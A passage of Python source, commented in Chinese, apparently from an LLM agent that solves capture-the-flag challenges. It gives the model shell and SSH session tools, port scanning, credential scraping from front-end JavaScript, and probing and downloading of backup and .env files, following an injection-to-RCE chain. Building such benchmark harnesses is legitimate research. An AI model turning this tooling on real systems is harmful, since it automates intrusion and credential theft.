        text = (out or "") + (err or "")
        return self._clip(f"exit={proc.returncode}\n{text or '(无输出)'}")

    # -- 持久会话 --------------------------------------------------

    def session_start(self, command: str = "", use_pty: bool = True) -> str:
        command = str(command or "").strip()
        if not command:
            return "command 为空"
        self.pace()
        # 单条程序才加 exec（省一层 shell、信号更直接）；带管道/分号/重定向的复合
        # 命令不能加 exec，否则 exec 把 shell 替换掉，后面的命令永远不会执行。
        wrapped = (command if re.search(r"[;&|<>`$]", command)
                   else f"exec {command}")
        argv = ["bash", "-c", wrapped]
        try:
            session = self.sessions.start(argv, use_pty=use_pty and pty_available(),
                                          env=self.tool_env())
        except Exception as exc:  # noqa: BLE001
            return f"会话启动失败: {type(exc).__name__}: {exc}"
        time.sleep(0.6)
        head = session.read(wait=1.2)
        return (f"已创建会话 id={session.sid}，命令：{command}\n"
                f"（用 {{\"session\":\"send\",\"id\":{session.sid},...}} 发送，"
                f"{{\"session\":\"read\",\"id\":{session.sid}}} 读取）\n"
                f"初始输出：\n{self._clip(head) if head else '(暂无输出)'}")

    def session_send(self, id: int = 0, text: str = "", wait: float = 0.0) -> str:
        session = self.sessions.get(id)
        if session is None:
            return f"没有 id={id} 的会话。当前会话：{self.sessions.list()}"
        payload = str(text or "")
        if payload and not payload.endswith("\n"):
            payload += "\n"
        self.pace()
        try:
            session.write(payload)
        except Exception as exc:  # noqa: BLE001
            return f"写入会话 {id} 失败: {type(exc).__name__}: {exc}"
        if wait:
            time.sleep(min(float(wait), 10))
        out = session.read(wait=2.0)
        return self._clip(f"会话 {id} 输出：\n{out or '(暂无新输出)'}")

    def session_read(self, id: int = 0, wait: float = 2.0) -> str:
        session = self.sessions.get(id)
        if session is None:
            return f"没有 id={id} 的会话。当前会话：{self.sessions.list()}"
        out = session.read(wait=min(float(wait or 2.0), 15))
        state = "存活" if session.alive() else "已退出"
        return self._clip(f"会话 {id}（{state}）输出：\n{out or '(暂无新输出)'}")

    def session_list(self) -> str:
        rows = self.sessions.list()
        if not rows:
            return "当前没有会话。要用交互式命令（ssh/nc/python）先 session_start。"
        return "\n".join(f"id={r['id']} {'存活' if r['alive'] else '已退出'} "
                          f"{r['age']}s  {r['cmd']}" for r in rows)

    def session_kill(self, id: int = 0) -> str:
        return (f"已关闭会话 {id}" if self.sessions.kill(id)
                else f"没有 id={id} 的会话")

    def ssh_shell(self, port: int = 22, user: str = "", password: str = "",
                  command: str = "") -> str:
        """用 paramiko 开一个真正的交互 shell（镜像里没有 ssh 客户端）。"""
        host = self.context.host
        try:
            import paramiko  # type: ignore
        except ImportError:
            return "paramiko 不可用，无法开 SSH 会话"
        if not user:
            return "需要 user（可选 password）"
        self.pace()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=int(port), username=user,
                           password=password or None, timeout=8,
                           banner_timeout=8, auth_timeout=8,
                           allow_agent=False, look_for_keys=False)
        except Exception as exc:  # noqa: BLE001
            return f"SSH 登录失败 {user}@{host}:{port}: {type(exc).__name__}: {exc}"
        if command:
            try:
                _, stdout, stderr = client.exec_command(command, timeout=25)
                out = stdout.read().decode("utf-8", "replace")
                err = stderr.read().decode("utf-8", "replace")
            finally:
                client.close()
            return self._clip(f"SSH {user}@{host} 执行 {command}\nexit0\n{out}{err}")
        try:
            channel = client.invoke_shell(width=200, height=50)
        except Exception as exc:  # noqa: BLE001
            client.close()
            return f"打开 SSH shell 失败: {type(exc).__name__}: {exc}"
        session = self.sessions.attach(channel, f"ssh {user}@{host}:{port}")
        time.sleep(1.0)
        head = session.read(wait=1.5)
        return (f"SSH 会话已建立 id={session.sid}（{user}@{host}:{port}）\n"
                f"用 session_send 发命令，session_read 读结果\n{self._clip(head)}")

    def decode(self, value: str = "", kind: str = "base64") -> str:
        import base64
        import binascii
        raw = str(value or "")
        kind = str(kind or "base64").lower()
        try:
            if kind == "base64":
                padded = raw + "=" * (-len(raw) % 4)
                return base64.b64decode(padded).decode("utf-8", errors="replace")
            if kind == "hex":
                return binascii.unhexlify(raw).decode("utf-8", errors="replace")
            if kind == "url":
                return urllib.parse.unquote(raw)
            if kind == "rot13":
                import codecs
                return codecs.decode(raw, "rot13")
            return f"不支持的 kind: {kind}"
        except Exception as exc:
            return f"解码失败: {type(exc).__name__}: {exc}"

    ALLOWED = {
        "http_request": "http_request", "http_get": "http_get",
        "http_post": "http_post", "port_scan": "port_scan",
        "tcp_send": "tcp_send", "shell": "shell", "decode": "decode",
        "ssh_audit": "ssh_audit", "ssh_login": "ssh_login",
        "dns_query": "dns_query", "udp_probe": "udp_probe",
        "mdns": "mdns", "rescan": "rescan",
        "session_start": "session_start", "session_send": "session_send",
        "session_read": "session_read", "session_list": "session_list",
        "session_kill": "session_kill", "ssh_shell": "ssh_shell",
    }

    def run(self, tool: str, args: dict) -> str:
        name = self.ALLOWED.get(str(tool))
        if name is None:
            return f"未知工具 {tool!r}，可用：{sorted(self.ALLOWED)}"
        args = args if isinstance(args, dict) else {}
        try:
            return getattr(self, name)(**args)
        except TypeError as exc:
            return f"参数不匹配 {tool}: {exc}"
        except Exception as exc:
            return f"工具 {tool} 执行异常: {type(exc).__name__}: {exc}"


def recon_scan(context: SolveContext, board: FactBoard,
               emit_events: bool = True, deep: bool = False) -> str:
    """代码驱动的开场侦察：扫端口 → 抓 banner → 判协议 → 落事实。

    这一步不经过模型。它是「看清门在哪、是什么锁」的动作，与模型能力无关，
    却是旧实现里完全缺失的一环。

    默认只扫提示端口及其邻域：平台给的地址只是线索，同一宿主机 IP 上挂着多道题
    的不同端口，扫全端口会把 agent 引去攻击别的题的容器。`deep=True` 才升级到
    全量端口表（模型发现该扫的地方没东西时会主动调 rescan）。
    """
    host = context.host
    if not host:
        return ""
    ports = sense.expand_ports(context.hint_ports, deep=deep)
    started = time.time()
    open_ports = sense.scan(host, ports)
    if emit_events:
        emit("recon_scan", host=host, scanned=len(ports), open=len(open_ports),
             deep=deep, elapsed=round(time.time() - started, 1))

    lines = [f"扫描 {len(ports)} 个端口，开放 {len(open_ports)} 个: {open_ports}"]
    closed_hints = [p for p in context.hint_ports if p not in open_ports]
    if closed_hints and not open_ports:
        # 这条提示很关键：平台给的端口可能没映射到本容器，模型若当成「再扫一遍」
        # 就会拿 nmap -p- 反复撞墙，把 40 步预算烧光。
        lines.append(
            f"注意：平台给的端口 {closed_hints} 全部连接失败（拒绝或超时），"
            f"说明映射可能未就绪或实例还在启动。先做一次 TCP 直连确认，"
            f"再扫 {host} 的邻近端口；不要用 nmap -p- 全量扫。")
    protos: dict[int, str] = {}
    for port in open_ports:
        info = sense.fingerprint(host, port)
        proto = info.get("proto") or "unknown"
        protos[port] = proto
        detail = f"{host}:{port} {proto}"
        banner = (info.get("banner") or "").replace("\n", " ")[:120]
        if banner:
            detail += f' "{banner}"'
        board.add(Fact("service", f"{host}:{port}", detail, "low"))
        lines.append(f"  {port}: {proto} {banner[:90]}")

    # 入口选择：优先用平台给的提示端口，不用「碰到的第一个 http 服务」。
    # 共享宿主机上这个顺序差异会直接决定 agent 打的是不是本题。
    if not context.base_url:
        context.base_url = _choose_base_url(host, protos, context.hint_ports)
        if context.base_url:
            board.add(Fact("service", f"base_url:{context.base_url}",
                           f"默认 Web 入口 {context.base_url}", "low"))
            # 标记「本题入口」，让候选动作优先给这个端口——同宿主机上的其他服务
            # 属于别的题，不该抢占有限的候选名额。
            try:
                entry_port = str(urllib.parse.urlsplit(context.base_url).port or "")
            except ValueError:
                entry_port = ""
            if entry_port:
                # key 要带前缀：事实板按 key 去重，用 "host:port" 会和 service 撞车
                board.add(Fact("entry", f"entry:{host}:{entry_port}",
                               f"本题入口 {context.base_url}", "high"))

    # 路由与凭据发现：首页 + 它引用的 JS，抽路径与硬编码 key。
    # 这是纯确定性工作，不该花模型步数——实测模型会为同一个 app.js 反复下载六次。
    if context.base_url.startswith("http"):
        routes, secrets, js_len, api_entries, encoded_creds = _discover_routes(context.base_url)
        # 前端 JS 里的接口和参数名直接入图：这是「事实驱动」的原料，
        # 模型不用再自己花十几步去 JS 里翻参数名。
        if context.graph is not None and api_entries:
            added = context.graph.add_entries(api_entries)
            emit("solve_graph_seed", base=context.base_url,
                 new_entries=len(added), **context.graph.stats())
        if encoded_creds:
            for item in encoded_creds:
                board.add(Fact("credential", f"encoded:{item}",
                               f"前端代码里解出的凭据 {item}", "high"))
            if context.graph is not None:
                context.graph.add_creds(encoded_creds)
            lines.append(f" 前端代码里解出的凭据 {len(encoded_creds)} 条："
                         + ", ".join(encoded_creds[:6]))
        if routes:
            lines.append(f" 前端路由/接口 {len(routes)} 个：" + ", ".join(routes[:18]))
            for route in routes[:18]:
                board.add(Fact("route", f"route:{route}",
                               f"{context.base_url.rstrip('/')}{route}", "low"))
        if secrets:
            lines.append(f" 前端硬编码凭据 {len(secrets)} 条：" + ", ".join(secrets[:6]))
            for item in secrets:
                board.add(Fact("credential", f"secret:{item}",
                               f"前端 JS 里出现 {item}", "high"))

        # 敏感路径批量探测：这一批在旧实现里是模型一步一个 curl 打的，实测吃掉
        # 二三十步。它们的判定完全确定（存在/不存在），交给代码跑，命中结果直接
        # 进事实板——同样一份信息，步数成本从二十几步降到 0。
        # 除了固定词表，还要把前端抽到的路由（含 base+相对路径拼接结果）一起探，
        # 真实入口常常只出现在 JS 里（a-04 的 /api/upload.php 就是拼出来的）。
        extra = [p for p in sense.combine_routes(routes) if p.startswith("/")]
        hits = sense.bulk_probe(context.base_url,
                                paths=list(sense.PROBE_PATHS) + extra)
        if emit_events:
            emit("recon_probe", base=context.base_url,
                 probed=len(sense.PROBE_PATHS) + len(extra), hits=len(hits),
                 paths=[f"{h['path']}({h['status']})" for h in hits[:12]])
        if hits:
            lines.append(f" 敏感路径命中 {len(hits)} 个：" + ", ".join(
                f"{h['path']}({h['status']})" for h in hits[:14]))
            for hit in hits[:14]:
                alive = hit["status"] not in (200, 201, 204)
                board.add(Fact("route", f"probe:{hit['path']}",
                               f"{context.base_url.rstrip('/')}{hit['path']} → "
                               f"{hit['status']} {hit['snippet'][:80]}",
                               "low" if alive else "high"))
            # 备份 / 源码 / 配置类命中往往直接带凭据甚至 Flag，先把内容捞出来。
            # 抓到的正文原样并进侦察文本，由调用方统一做 Flag 提取与入库。
            leaked = 0
            for hit in hits:
                if leaked >= 2:
                    break
                if not any(k in hit["path"] for k in
                           ("backup", "sql", "zip", "bak", ".env", "config")):
                    continue
                body = sense.read_url(context.base_url.rstrip("/") + hit["path"])
                if not body:
                    continue
                leaked += 1
                lines.append(f"  下载 {hit['path']}（{len(body)} 字符）正文片段：\n"
                             + body[:1200])
                if re.search(r"(?i)(passwd|password|secret|token|api[_-]?key)", body):
                    board.add(Fact("artifact", f"leak:{hit['path']}",
                                   f"{hit['path']} 内含凭据线索", "high"))
                for cred in sense.extract_secrets(body)[:4]:
                    board.add(Fact("credential", f"secret:{cred}",
                                   f"{hit['path']} 里出现 {cred}", "high"))

    # mDNS：动态靶标常用它公布真实端点
    if 5353 in open_ports or not open_ports:
        names = sense.mdns_services()
        if names:
            lines.append("mDNS 公布: " + ", ".join(names[:8]))
            for name in names[:8]:
                board.add(Fact("artifact", f"mdns:{name}", f"mDNS 服务 {name}",
                               "low"))
    return "\n".join(lines)


def _choose_base_url(host: str, protos: dict[int, str],
                     hint_ports: list[int]) -> str:
    """挑一个 Web 入口。以 fingerprint 判出的协议为准，提示端口优先。

    不能按端口号猜：靶标常用 30000+ 的随机端口跑 HTTP，也常在 5432 上放
    非 Postgres 的东西。
    """
    web = [port for port, proto in protos.items() if proto == "https"]
    plain = [port for port, proto in protos.items() if proto == "http"]
    if not web and not plain:
        return ""
    for port in hint_ports:
        if port in plain:
            return f"http://{host}:{port}"
        if port in web:
            return f"https://{host}:{port}"
    if plain:
        return f"http://{host}:{plain[0]}"
    return f"https://{host}:{web[0]}"


def _build_pick_prompt(challenge: Challenge, context: SolveContext) -> str:
    board = context.board
    candidates = propose(board)
    lines = [
        "## 题目",
        f"编号: {challenge.unique_code}  难度: {challenge.difficulty or '未知'} "
        f"分值: {challenge.total_score}  Flag 数量: {challenge.flag_count}",
        "",
        "## 题面",
        challenge.description.strip() or "（平台未给出题面，只能靠主动侦察）",
        "",
    ]
    if context.hint:
        lines += [
            "## 平台提示（官方给的，优先按这个方向打，不要绕开它）",
            context.hint.strip(),
            "",
        ]
    lines += [
        "## 靶标",
        f"host = {context.host}",
        f"平台给的端口 = {context.hint_ports or '(未给)'}",
        f"当前 Web 入口 = {context.base_url or '(未发现)'}",
        "",
        "## 事实板（代码已核实的观测结论）",
        board.snapshot() if board else "（空）",
        "",
    ]
    if context.graph is not None:
        lines += [
            "## 攻击图（下一步该打哪里由它决定，待验证边会被代码自动执行）",
            context.graph.snapshot(),
            "",
        ]
    lines += [
        "## 会话",
        context.sessions_text or "（没有活跃会话）",
        "",
        "## 候选动作（不知道做什么时从这里挑，也可以直接写 cmd）",
    ]
    if candidates:
        lines += [item.line() for item in candidates]
    else:
        lines.append("- 没有可用候选，直接写命令")
    if context.attempts:
        lines += ["", "## 已经跑过的动作（**不要再跑一遍**，输出就在下面摘要里）"]
        # 条数别太少：模型重复做同一件事，往往是因为它看不到自己做过什么
        lines += context.attempts[-24:]
    if context.excluded:
        tried = sorted(context.excluded.items(), key=lambda kv: -kv[1])[:10]
        lines += ["", "## 已排除（这些族在对应路径上失败过，换族而不是换写法）"]
        lines += [f"- {key}（FAILED {count} 次）" for key, count in tried]

    recent = context.observations[-3:]
    if recent:
        lines += ["", "## 最近几步原始观测"]
        for obs in recent:
            body = obs.output
            if len(body) > 1400:
                body = body[:1400] + "..."
            lines.append(f"### 第 {obs.step} 步 {obs.tool}"
                         f"({json.dumps(obs.args, ensure_ascii=False)[:120]})\n{body}")
    lines += ["", "输出一个 JSON 对象。能跑命令就别挑候选。"]
    return "\n".join(lines)


def _extract_json_object(text: str) -> dict | None:
    """从模型回复里取出第一个 JSON 对象，容忍前后包裹的文字。"""
    text = (text or "").strip()
    if not text:
        return None
    if text.startswith("```"):
        text = re.sub(r"^```[a-zA-Z]*\s*", "", text)
        text = re.sub(r"\s*```$", "", text)
    try:
        payload = json.loads(text)
        return payload if isinstance(payload, dict) else None
    except json.JSONDecodeError:
        pass
    depth, start = 0, -1
    for idx, ch in enumerate(text):
        if ch == "{":
            if depth == 0:
                start = idx
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0 and start >= 0:
                try:
                    payload = json.loads(text[start:idx + 1])
                except json.JSONDecodeError:
                    start = -1
                    continue
                if isinstance(payload, dict):
                    return payload
                start = -1
    return None


def solve_challenge(challenge: Challenge, started: StartResult, client, *,
                    deadline: float | None = None, max_steps: int | None = None,
                    shell_timeout: int = 30,
                    submit: Callable[[str], Any] | None = None,
                    bench_client: Any = None) -> list[str]:
    """跑单道题：代码侦察打底，然后交给 artex 式 agent 循环。

    client 是 LLM 客户端（必须实现 chat(system, messages, tools)，返回完整
    content blocks）；bench_client 是平台客户端（拿官方提示用），两个是不同
    的对象，别混。
    """
    host, hint_ports = parse_targets(started.container_addr)
    if not host:
        emit("solve_no_target", unique_code=challenge.unique_code,
             container_addr=started.container_addr,
             note="平台未返回可用靶标地址")
        return []

    # 并发跑多题时同一台宿主机 IP 上可能同时挂着几道题，事实板按题隔离，
    # 否则两个线程会写同一个 facts-*.jsonl。
    board = FactBoard(
        path=os.path.join("/tmp", f"facts-{challenge.unique_code}-"
                                  f"{int(time.time() * 1000)}.jsonl"), host=host)
    context = SolveContext(host=host, hint_ports=hint_ports, board=board)
    toolkit = Toolkit(context, shell_timeout=shell_timeout)
    steps = max_steps or int(os.environ.get("BENCH_MAX_STEPS", "90"))
    steps = max(1, min(steps, MAX_STEPS_HARD_CAP))
    if deadline is None:
        deadline = time.time() + int(os.environ.get("BENCH_CHALLENGE_SECONDS", "780"))

    emit("solve_begin", unique_code=challenge.unique_code, host=host,
         hint_ports=hint_ports, max_turns=steps,
         budget_seconds=int(deadline - time.time()))

    verified: list[str] = []
    seen: set[str] = set()

    def submit_flag(flag: str, step: int, source: str) -> bool:
        key = flag.lower()
        if key in seen or len(verified) >= MAX_FLAGS_PER_CHALLENGE:
            return False
        seen.add(key)
        verified.append(flag)
        board.add(Fact("flag", f"flag:{key}", f"候选 Flag {flag[:80]}", "low", step))
        if submit is None:
            emit("solve_flag_found", unique_code=challenge.unique_code, step=step,
                 flag=flag, source=source)
            return True
        try:
            result = submit(flag)
        except Exception as exc:  # noqa: BLE001
            emit("solve_submit_error", unique_code=challenge.unique_code, step=step,
                 detail=f"{type(exc).__name__}: {exc}"[:160])
            return True
        correct = bool(getattr(result, "correct", False))
        emit("solve_submit", unique_code=challenge.unique_code, step=step,
             flag=flag[:100], correct=correct, source=source,
             progress=f"{getattr(result, 'correct_flag_count', '?')}/"
                      f"{getattr(result, 'total_flag_count', '?')}")
        return correct

    # ---- 工作区先行：双图都落盘在 /tmp/ws/<题号>/ 下（artex 的「真值库」）----
    ws_root = os.path.join("/tmp", "ws",
                           f"{challenge.unique_code}-{int(time.time() * 1000)}")
    workspace = Workspace(ws_root)

    # ---- 阶段一：代码侦察（不经过模型）----
    # 图必须在侦察之前建好：侦察阶段就会抓到首页和前端 JS，里面的接口和参数名
    # 是后面所有假设的原料。侦察结果同时喂资产图（entry/边）和工作区笔记。
    graph = AttackGraph(os.path.join(ws_root, "asset_graph.json"))
    context.graph = graph
    recon_text = recon_scan(context, board)
    for flag in extract_flags(recon_text):
        submit_flag(flag, 0, "侦察响应提取")
    if board.stats()["services"] == 0:
        emit("solve_blind", unique_code=challenge.unique_code,
             note="端口扫描未发现任何服务，本题可能不可达")

    seed_entries = graph.add_entries(extract_entries(recon_text))
    if seed_entries:
        emit("solve_graph_seed", unique_code=challenge.unique_code,
             new_entries=len(seed_entries), **graph.stats())

    # ---- 平台官方提示：价值远高于模型自己猜，开局就取 ----
    if bench_client is not None and hasattr(bench_client, "get_hint"):
        try:
            hint_result = bench_client.get_hint(challenge.unique_code)
            text = (getattr(hint_result, "hint", None) or "").strip()
        except Exception as exc:  # noqa: BLE001
            text = ""
            emit("solve_hint_error", unique_code=challenge.unique_code,
                 detail=f"{type(exc).__name__}: {exc}"[:160])
        if text:
            context.hint = text
            emit("solve_hint", unique_code=challenge.unique_code, hint=text[:300],
                 step=0)

    # ---- 探索图（血缘链；与资产图同目录落盘）----
    explore = ExploreGraph(os.path.join(ws_root, "graph.json"))

    # 官方提示直指漏洞类型与命中位置，优先派 intent。
    if context.hint:
        explore.add_intent("web", context.base_url or host,
                           f"官方提示：{context.hint}", step=0)
    # 资产图上已有的边按族转成初始 intent；模型认领 intent、按族执行、收口。
    families_seen: set[str] = set()
    for edge in graph.pending():
        if edge.family not in families_seen:
            families_seen.add(edge.family)
            explore.add_intent(edge.family,
                               edge.entry.key if edge.entry else "global",
                               edge.why, step=0)
    if not explore.stats()["pending"]:
        explore.add_intent("recon", context.base_url or host,
                           "开局侦察：批量路径与入口确认", step=0)
    workspace.write_todo(
        "- [ ] 认领一条 intent 并执行（前置：无）\n"
        "- [ ] 每条利用链的后续步骤在这里按依赖追加（注入 → 凭据 → 登录 → RCE）\n")
    workspace.append_note("## 开场侦察摘要\n" + recon_text[:1200])

    # ---- 阶段二：agent 循环（模型持工具自主推进）----
    runner = AgentRunner(challenge, client, toolkit, workspace=workspace,
                         asset_graph=graph, explore=explore,
                         base_url=context.base_url, max_turns=steps,
                         deadline=deadline, on_flag=submit_flag)
    try:
        summary = runner.run()
    finally:
        emit("solve_done", unique_code=challenge.unique_code,
             verified=len(verified),
             turns=runner.turns,
             explore=json.dumps(explore.stats(), ensure_ascii=False))
    return verified


def make_llm_solver(*, max_steps: int | None = None,
                    total_seconds: int | None = None,
                    shell_timeout: int = 30) -> Callable[..., list[str]]:
    """构造解题器。第三个参数 submit 由 run_benchmark 注入，用于实时提交。"""
    from .llm import MiniMaxClient, get_config

    client = MiniMaxClient(get_config())
    total = total_seconds or int(os.environ.get("BENCH_TOTAL_SECONDS", "27000"))
    global_deadline = time.time() + total

    def solver(challenge: Challenge, started: StartResult,
               submit=None, bench_client=None) -> list[str]:
        # 单题 780s（13 分钟）：上一轮 7 题各占满 900s 正好吃光 6300s 总预算，
        # 最后一道题拿到 0 秒被直接跳过。
        per = int(os.environ.get("BENCH_CHALLENGE_SECONDS", "780"))
        deadline = min(time.time() + per, global_deadline)
        if deadline <= time.time():
            emit("solve_skipped", unique_code=challenge.unique_code,
                 reason="全局时间预算已用尽")
            return []
        return solve_challenge(challenge, started, client, deadline=deadline,
                               max_steps=max_steps, shell_timeout=shell_timeout,
                               submit=submit, bench_client=bench_client)
    return solver
